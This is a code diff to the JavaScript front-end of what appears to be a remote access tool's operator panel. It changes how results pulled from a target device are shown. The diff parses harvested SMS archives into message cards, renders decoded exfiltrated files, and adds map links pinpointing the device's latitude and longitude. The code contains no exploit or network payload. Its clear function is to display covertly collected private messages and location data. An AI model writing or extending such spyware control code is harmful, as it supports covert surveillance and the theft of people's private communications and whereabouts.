@@ -3569,19 +3569,25 @@
 
         function _parseSmsArchive(text) {
             const entries = [];
-            // Split by separator lines (─── or ════)
             const blocks = text.split(/\n(?=────)/);
             for (const block of blocks) {
-                const lines = block.split('\n').map(l => l.trim()).filter(Boolean);
-                if (lines.length < 4) continue;
-                // Find sender line (starts with 👤) and time line (starts with 🕐)
+                const lines = block.split('\n').map(l => l.trim()).filter(l => {
+                    if (!l) return false;
+                    // strip obfuscated bracket labels like [Ἁ怕恹邫⃘냻킉恖] #N
+                    if (/^\[.{2,}\]\s*#\d/.test(l)) return false;
+                    return true;
+                });
+                if (lines.length < 3) continue;
                 const senderLine = lines.find(l => l.startsWith('👤'));
                 const timeLine = lines.find(l => l.startsWith('🕐'));
                 if (!senderLine || !timeLine) continue;
                 const sender = senderLine.replace('👤', '').trim();
                 const time = timeLine.replace('🕐', '').trim();
-                // Body: everything after the second separator line
-                const sepIdx = lines.findLastIndex(l => /^─+$/.test(l));
+                // body is everything after the last ─── separator
+                let sepIdx = -1;
+                for (let i = lines.length - 1; i >= 0; i--) {
+                    if (/^─+$/.test(lines[i])) { sepIdx = i; break; }
+                }
                 const body = lines.slice(sepIdx + 1).join('\n').trim();
                 if (!body) continue;
                 entries.push({ sender, time, body });
@@ -3589,8 +3595,34 @@
             return entries;
         }
 
+        function _ratResultWin(style) {
+            let win = document.getElementById('ratResultWin');
+            if (!win) {
+                win = document.createElement('div');
+                win.id = 'ratResultWin';
+                win.className = 'float-win open';
+                document.body.appendChild(win);
+            } else {
+                win.classList.add('open');
+            }
+            Object.assign(win.style, { position: 'fixed', zIndex: '250', ...style });
+            return win;
+        }
+
         function ratShowResult(cmd, data) {
-            // Decode base64 file and render SMS archive as cards
+            // location: add map links
+            if (data && typeof data === 'object' && (data.latitude != null || data.lat != null)) {
+                const lat = data.latitude ?? data.lat;
+                const lon = data.longitude ?? data.lon ?? data.lng;
+                if (lat != null && lon != null) {
+                    data = Object.assign({}, data, {
+                        _yandex_maps: `https://maps.yandex.ru/?ll=${lon},${lat}&z=15&pt=${lon},${lat}`,
+                        _google_maps: `https://maps.google.com/?q=${lat},${lon}`
+                    });
+                }
+            }
+
+            // base64 file result (sms_archive_file, etc.)
             if (data && typeof data === 'object') {
                 const fileKey = Object.keys(data).find(k => k.endsWith('_file') && typeof data[k] === 'string' && data[k].length > 10);
                 if (fileKey) {
@@ -3600,20 +3632,13 @@
                         const isSms = fileKey === 'sms_archive_file';
                         const entries = isSms ? _parseSmsArchive(text) : null;
 
-                        let existing = document.getElementById('ratResultWin');
-                        if (!existing) {
-                            existing = document.createElement('div');
-                            existing.id = 'ratResultWin';
-                            existing.className = 'float-win open';
-                            document.body.appendChild(existing);
-                            _makeDraggableWin(existing);
-                        } else {
-                            existing.classList.add('open');
-                        }
-                        existing.style.cssText = 'top:60px;right:20px;width:440px;max-height:80vh;z-index:250;display:flex;flex-direction:column;';
-
                         const count = data.sms_count || (entries ? entries.length : '');
-                        existing.innerHTML = `<div class="float-win-header"><i data-feather="message-square"></i><span class="float-win-title">SMS (${count})</span><div class="float-win-actions"><button class="float-win-btn close" onclick="this.closest('.float-win').remove()"><i data-feather="x"></i></button></div></div><div class="float-win-body" id="ratSmsBody" style="overflow-y:auto;padding:8px;flex:1;"></div>`;
+                        const icon = isSms ? 'message-square' : 'file';
+                        const title = isSms ? `SMS (${count})` : fileKey.replace('_file', '');
+
+                        const win = _ratResultWin({ top: '60px', right: '20px', width: '440px', maxHeight: '80vh', display: 'flex', flexDirection: 'column' });
+                        win.innerHTML = `<div class="float-win-header"><i data-feather="${icon}"></i><span class="float-win-title">${title}</span><div class="float-win-actions"><button class="float-win-btn close" onclick="this.closest('.float-win').remove()"><i data-feather="x"></i></button></div></div><div class="float-win-body" id="ratSmsBody" style="overflow-y:auto;padding:8px;flex:1;"></div>`;
+                        _makeDraggableWin(win);
 
                         const body = document.getElementById('ratSmsBody');
                         if (entries && entries.length) {
@@ -3633,20 +3658,12 @@
                     } catch(e) { console.error('decode error', e); }
                 }
             }
-            let existing = document.getElementById('ratResultWin');
-            if (!existing) {
-                existing = document.createElement('div');
-                existing.id = 'ratResultWin';
-                existing.className = 'float-win open';
-                existing.style.cssText = 'top:100px;right:20px;width:380px;max-height:500px;z-index:250;';
-                existing.innerHTML = '<div class="float-win-header"><i data-feather="terminal"></i><span class="float-win-title">' + L('result_title') + '</span><div class="float-win-actions"><button class="float-win-btn close" onclick="this.closest(\'.float-win\').remove()"><i data-feather="x"></i></button></div></div><div class="float-win-body" style="max-height:400px;"><pre id="ratResultPre" style="font-size:0.7rem;color:var(--text-gray);white-space:pre-wrap;word-break:break-all;margin:0;"></pre></div>';
-                document.body.appendChild(existing);
-                _makeDraggableWin(existing);
-            } else {
-                existing.classList.add('open');
-            }
-            const pre = document.getElementById('ratResultPre');
-            pre.textContent = '=== ' + cmd + ' ===\n' + JSON.stringify(data, null, 2);
+
+            // generic JSON result
+            const win = _ratResultWin({ top: '100px', right: '20px', width: '400px', maxHeight: '500px', display: '' });
+            win.innerHTML = '<div class="float-win-header"><i data-feather="terminal"></i><span class="float-win-title">' + L('result_title') + '</span><div class="float-win-actions"><button class="float-win-btn close" onclick="this.closest(\'.float-win\').remove()"><i data-feather="x"></i></button></div></div><div class="float-win-body" style="max-height:400px;overflow-y:auto;"><pre id="ratResultPre" style="font-size:0.7rem;color:var(--text-gray);white-space:pre-wrap;word-break:break-all;margin:0;"></pre></div>';
+            _makeDraggableWin(win);
+            document.getElementById('ratResultPre').textContent = '=== ' + cmd + ' ===\n' + JSON.stringify(data, null, 2);
             feather.replace();
         }
 
